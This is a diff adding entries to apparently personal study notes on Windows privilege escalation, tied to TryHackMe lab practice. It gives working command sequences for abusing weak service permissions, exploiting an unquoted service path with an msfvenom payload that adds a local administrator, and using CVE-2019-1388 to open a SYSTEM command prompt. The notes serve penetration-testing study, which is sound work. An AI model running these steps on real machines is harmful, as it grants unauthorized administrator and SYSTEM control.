@@ -238,3 +238,56 @@
 * checking results: `net localgroup administrators`
 
 ### Escalation path: Service Permissions
+
+#### **Important:** in Invoke-Allchecks that we can restart the service, so we can add something to it and restart it!
+
+##### [For reference: Payloads All The Things.](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools)
+
+* **exapmle 1:** found ***daclsvc*** service
+* run ***accesschk64.exe*** against it: `accesschk64.exe -wuvc daclsvc`
+* query the service: `sc qc daclsvc`
+* use the binary path name which is calling out this daclsvc service, we have the changeconfig service we can change the path
+* `sc config daclsvc binpath= "net localgroup administrators user /add"`
+* it will say ***success!***
+* nothing will show up as of now but if we start the service: `sc start daclsvc` then `net localgroup administrators`
+* there will be a creater "user" withing the administrators group
+
+### Escalation via Unquoted Service Path
+### (Because it's not quoted off we can modify it and get malicious with it!)
+
+#### Discovery:
+
+* `accesschk64.exe -uwvc Everyone *`
+* We are looking for a few things:
+1. **-u** to surpess errors
+2. **-w** only objects that have wrigth access
+3. **-c** service name
+4. **-v** verbose
+5. **Everyone** is a group
+6. in results look for a ***BINARY_PATH_NAME field*** that displays a path that is not confined between quotes.
+
+#### Exploitation:
+
+* `powershell -ep bypass
+* `. .\PowerUps.ps1`
+* `Invoke-AllChecks`
+* in msfvenom on kali: `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
+* copy the generated file ***common.exe***to the Windows VM
+* place ***common.exe*** in `C:\Program Files\Unquoted Path Service`
+* Windows VM command prompt: `sc start unquotedsvc`
+* check if user was added to the local administrators group in the command prompt: `net localgroup administrators`
+* for additional practice play: [**Tryhackme.com room: Steal Mountain**](https://tryhackme.com/room/steelmountain)
+
+### Escalation path via CVE-2019-1388
+
+* close down IE, right click on ***hhupd.exe*** file, check properties. Make sure there's no security features in it, if there is make sure to uncheck it
+* right click on file, run as adminitrator
+* you get the UAC (User Access Control) prompt
+* click ***issues by*** certificate, it will open up Internet Explorer as system
+* when it opens up, click on the settings cog on the right hand side, ***file*** and then ***save as***
+* you'll get an error message, just ignore it
+* in the save file as window for file name type in: `C:\Windows\System32\*.*` this will take you to the file system within that window
+* what we want to find is the ***cmd.exe*** right click on it, open
+* in prompt: `whoami` and we'll see that we are AUTHORITY\SYSTEM
+
+
